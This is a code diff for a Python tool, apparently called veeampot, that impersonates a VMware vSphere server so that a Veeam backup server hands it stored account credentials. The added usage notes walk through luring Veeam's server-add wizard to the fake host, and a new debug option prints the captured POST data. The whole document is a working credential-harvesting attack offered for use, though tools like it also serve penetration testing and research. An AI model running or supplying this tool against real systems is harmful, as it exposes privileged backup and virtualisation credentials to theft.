@@ -1,8 +1,38 @@
 #!/usr/bin/env python3
 
+"""
+About: 
+
+  Python script to emulate vSphere responses to retrieve stored 
+  credentials from Veeam.
+
+Usage:
+
+  1. Run the script ./veeampot.py
+  2. Start the VMware vSphere Server Add Wizard from the 
+     Infrastructure section
+  3. Enter the address and port (default 8443) of the host on 
+     which the script is running
+  4. Select an account and connect (ignore the message about the
+     invalid certificate)
+  5. The script will print the credentials sent by Veeam
+  
+Changelog:  
+
+  21-10-25
+    * First release
+ 
+  22-07-20
+    * Minor fixes for Veam 9.5.4
+    + Added Debug option
+
+"""
+
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import ssl
 import re
+
+DEBUG = False # Set to True to view requests
 
 SERVER_PORT = 8443 # Listen port
 ReqNum = 1
@@ -18,7 +48,6 @@ class RequestHandler(BaseHTTPRequestHandler):
     
     def _counter(self):
         global ReqNum
-        #print(ReqNum)
         if ReqNum == 5:
             ReqNum = 1
         else:
@@ -26,15 +55,20 @@ class RequestHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         global ReqNum
+        global DEBUG
+        if DEBUG: print("Recived GET request #", ReqNum)
         self._add_headers()
         with open("data/resp-{}.txt".format(ReqNum), 'rb') as file: 
             self.wfile.write(file.read())
         self._counter()
                 
     def do_POST(self):
-        global ReqNum
+        global ReqNum        
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length).decode('utf-8')
+        if DEBUG: 
+        	print("Recived POST request #%d:\r\n%s\r\n" % (ReqNum, 
+        	post_data))
         self._add_headers()
         with open("data/resp-{}.txt".format(ReqNum), 'rb') as file: 
             self.wfile.write(file.read())
